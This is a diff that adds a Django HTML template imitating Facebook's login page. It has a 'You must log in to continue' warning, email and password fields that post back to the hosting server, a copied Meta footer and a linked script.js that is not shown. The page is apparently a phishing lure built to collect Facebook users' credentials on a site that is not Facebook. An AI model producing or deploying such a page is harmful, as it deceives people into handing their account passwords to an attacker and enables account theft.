@@ -1,0 +1,108 @@
+{% load static %}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Create New Account</title>
+    <link rel="stylesheet" href="{% static "sstyle.css" %}">
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <h1 class="logo">facebook</h1>
+        </div>
+        
+        <div class="notification">
+            <div class="notification-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white" width="16" height="16">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+                </svg>
+            </div>
+            <span>You must log in to continue.</span>
+        </div>
+        
+        <div class="login-container">
+            <h2>Log Into facebook</h2>
+            
+            <div class="yellow-notification">
+                You must log in to continue.
+            </div>
+            
+            <form id="login-form" method="POST">
+                <div class="form-group">
+                    <input type="email" id="email" placeholder="Email or phone number" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit" id="submitBtn" class="login-button">Log In</button>
+            </form>
+            
+            <div class="links-container">
+                <a href="#" class="forgot-link">Forgot account?</a>
+                <a href="#" class="create-account-link">Create new account</a>
+            </div>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="language-selector">
+            <a href="#" class="active">English (US)</a>
+            <a href="#">Español</a>
+            <a href="#">Français (France)</a>
+            <a href="#">中文(简体)</a>
+            <a href="#">العربية</a>
+            <a href="#">Português (Brasil)</a>
+            <a href="#">Italiano</a>
+            <a href="#">한국어</a>
+            <a href="#">Deutsch</a>
+            <a href="#">हिन्दी</a>
+            <a href="#">日本語</a>
+            <a href="#" class="more-languages">+</a>
+        </div>
+        
+        <div class="footer-links">
+            <a href="#">Sign Up</a>
+            <a href="#">Log In</a>
+            <a href="#">Messenger</a>
+            <a href="#">facebook Lite</a>
+            <a href="#">Video</a>
+            <a href="#">Places</a>
+            <a href="#">Games</a>
+            <a href="#">Marketplace</a>
+            <a href="#">facebook Pay</a>
+            <a href="#">facebook Store</a>
+            <a href="#">facebook Quest</a>
+            <a href="#">Ray-Ban facebook</a>
+            <a href="#">facebook AI</a>
+            <a href="#">Instagram</a>
+            <a href="#">Threads</a>
+            <a href="#">Fundraisers</a>
+            <a href="#">Services</a>
+            <a href="#">Voting Information Center</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Consumer Health Privacy</a>
+            <a href="#">Privacy Center</a>
+            <a href="#">Groups</a>
+            <a href="#">About</a>
+            <a href="#">Create ad</a>
+            <a href="#">Create Page</a>
+            <a href="#">Developers</a>
+            <a href="#">Careers</a>
+            <a href="#">Cookies</a>
+            <a href="#">Ad choices</a>
+            <a href="#">Terms</a>
+            <a href="#">Help</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+        </div>
+        
+        <div class="copyright">
+            Facebook © 2025
+        </div>
+    </footer>
+    
+    <script src="{% static 'script.js' %}"></script>
+</body>
+</html>
